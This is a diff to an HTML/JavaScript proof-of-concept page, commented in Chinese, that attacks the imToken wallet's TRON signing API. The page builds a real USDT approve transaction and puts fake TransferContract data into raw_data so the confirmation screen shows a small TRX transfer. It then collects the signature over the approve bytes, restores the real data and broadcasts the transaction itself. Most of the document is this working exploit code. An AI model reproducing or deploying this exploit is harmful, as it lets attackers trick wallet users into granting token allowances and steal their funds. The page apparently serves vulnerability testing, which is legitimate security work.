@@ -40,7 +40,7 @@
     <div style="font-size:13px; color:var(--text2); line-height:1.6;">
       ① <span class="highlight-green">普通 TRX 转账</span> — 验证 <code>tron.sendTransaction</code> 入口可用<br>
       ② <span class="highlight-green">原始 USDT approve</span> — 验证合约调用可正常上链<br>
-      ③ <span class="highlight-red">混合攻击</span> — 弹窗显示 TRX 转账，实际签署并广播 USDT approve<br>
+      ③ <span class="highlight-red">混合攻击</span> — 分离签名与广播：签名时欺骗显示，广播时还原真实数据<br>
       <br>
       攻击原理：imToken 的 <code>tron.sendTransaction</code> API 不校验 <code>raw_data</code> 与 <code>raw_data_hex</code> 是否一致<br>
       钱包确认页从 <code>raw_data.contract[0].type</code> 读取交易类型展示，但签名基于 <code>raw_data_hex</code> 字节<br>
@@ -246,6 +246,7 @@
   }
 
   // ③ 混合攻击：钱包显示 TRX 转账，实际签署 approve 授权
+  // 核心流程: 签名(欺骗显示) → 还原 raw_data → 手动广播(节点验证通过)
   async function mixedTx() {
     if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
     log('构造混合攻击交易…', 'warn');
@@ -254,6 +255,7 @@
       const userHex = window.tronWeb.address.toHex(walletAddr);
       const toHex = window.tronWeb.address.toHex(SPENDER);
 
+      // Step 1: 构建真实的 approve 交易
       const { transaction, result } = await window.tronWeb.transactionBuilder.triggerSmartContract(
         contractHex, 'approve(address,uint256)',
         { feeLimit: 100_000_000, callValue: 0 },
@@ -262,41 +264,101 @@
       );
       if (!result?.result) { log('approve 生成失败', 'error'); return; }
 
-      const realParam = transaction.raw_data.contract[0].parameter;
+      // 保存原始 approve 的 raw_data_hex 和 contract
+      const originalHex = transaction.raw_data_hex;
+      const originalContract = transaction.raw_data.contract[0];
+      const realParam = originalContract.parameter;
+
+      // Step 2: 构建假的 TransferContract 参数（给钱包确认页看）
       const fakeParam = {
         type_url: 'type.googleapis.com/protocol.TransferContract',
         value: {
           amount: 100000,
           to_address: toHex,
           owner_address: userHex,
-          data: ''                      // TransferContract memo 字段
+          data: ''
         }
       };
 
-      // 保存原始 raw_data_hex（真正的 approve 交易字节），防止后续操作污染
-      const originalHex = transaction.raw_data_hex;
-
-      // 混合攻击核心：替换 raw_data.contract[0]
-      // - 钱包确认页读取 type + parameter → 展示 TRX 转账
-      // - 节点处理 raw_data_hex → 执行 approve
-      // - 攻击前提: imToken 基于 raw_data_hex 签名，不重新序列化 raw_data
-      // - 注意：不能添加非标准字段（如数字键），否则 imToken 内部序列化会报错
+      // Step 3: 替换合约显示数据，欺骗钱包 UI
+      // 钱包读取 type + parameter → 显示 TRX 转账
+      // raw_data_hex 保持 approve 字节 → 钱包基于它签名
       transaction.raw_data.contract[0] = {
-        type: 'TransferContract',        // 钱包读取 → 显示 TRX 转账
-        parameter: fakeParam             // 钱包读取 → 显示转账详情
+        type: 'TransferContract',
+        parameter: fakeParam
       };
-      // 关键：确保 raw_data_hex 保持原始 approve 字节，不被重新序列化覆盖
       transaction.raw_data_hex = originalHex;
 
-      const hasSelector = originalHex.includes('095ea7b3');
-      log(`raw_data_hex 包含 approve 选择器 (095ea7b3): ${hasSelector}`, hasSelector ? 'success' : 'error');
-      log('✔ raw_data_hex 已保留原始 approve 字节数据', 'success');
-      log('✔ raw_data.contract[0] 已改为 TransferContract（钱包将显示 TRX 转账）', 'success');
-      log('⚠ 核心依赖: imToken 基于 raw_data_hex 签名，不重新序列化 raw_data', 'warn');
+      log('✔ raw_data 已改为 TransferContract（钱包将显示 TRX 转账）', 'success');
+      log('✔ raw_data_hex 保留原始 approve 字节', 'success');
 
-      const ok = await sendTx(transaction, '混合攻击 (approve)');
-      if (ok) {
-        setTimeout(() => refreshAllowanceUI(false), 12000);
+      // Step 4: 仅签名，不广播（分离签名与广播）
+      log('调用 tron.signTransaction 进行签名…', 'warn');
+      try {
+        const signed = await window.imToken.callPromisifyAPI('tron.signTransaction', {
+          tx: transaction,
+          from: walletAddr,
+          useTronHeader: true
+        });
+        log('签名返回: ' + JSON.stringify(signed), 'success');
+
+        // 提取签名
+        let signature = '';
+        if (typeof signed === 'string') {
+          signature = signed;
+        } else if (signed && typeof signed === 'object') {
+          signature = signed.signature || signed.sign || signed.signedTx || '';
+        }
+
+        if (!signature) {
+          log('未获取到签名数据', 'error');
+          return;
+        }
+        log('✔ 已获取签名', 'success');
+
+        // Step 5: 还原 raw_data 为真实的 approve 合约（供节点验证）
+        transaction.raw_data.contract[0] = originalContract;
+        transaction.raw_data_hex = originalHex;
+        // 附上签名
+        if (Array.isArray(signature)) {
+          transaction.signature = signature;
+        } else {
+          transaction.signature = [signature];
+        }
+
+        log('✔ raw_data 已还原为 TriggerSmartContract（供节点处理）', 'success');
+
+        // Step 6: 手动广播到 TRON 节点
+        log('手动广播交易到 TRON 节点…', 'warn');
+        const broadcastResp = await fetch(TRON_API + '/wallet/broadcasttransaction', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(transaction)
+        });
+        const broadcastData = await broadcastResp.json();
+
+        log('广播返回: ' + JSON.stringify(broadcastData), 'success');
+
+        if (broadcastData.result === true || broadcastData.txid || broadcastData.txID) {
+          const txid = broadcastData.txid || broadcastData.txID || broadcastData.result;
+          log('✅ 混合攻击交易已广播! TXID: ' + txid, 'success');
+          log('Tronscan: https://tronscan.org/#/transaction/' + txid, 'info');
+          setTimeout(() => refreshAllowanceUI(false), 12000);
+        } else if (broadcastData.code) {
+          log('❌ 广播失败: ' + (broadcastData.message || JSON.stringify(broadcastData)), 'error');
+        } else {
+          log('⚠ 广播结果不明: ' + JSON.stringify(broadcastData), 'warn');
+        }
+      } catch (signErr) {
+        log('签名失败: ' + (signErr.message || ''), 'error');
+        log('完整: ' + JSON.stringify(signErr), 'error');
+        if (signErr.message?.includes('reject')) log('用户取消签名', 'warn');
+        // 若 signTransaction 不存在，回退到 sendTransaction
+        if (signErr.message?.includes('not a function') || signErr.message?.includes('undefined')) {
+          log('signTransaction 不可用，回退到 sendTransaction（可能失败）', 'warn');
+          const ok = await sendTx(transaction, '混合攻击 (approve)');
+          if (ok) setTimeout(() => refreshAllowanceUI(false), 12000);
+        }
       }
     } catch (e) {
       log('构造失败: ' + (e.message || e), 'error');
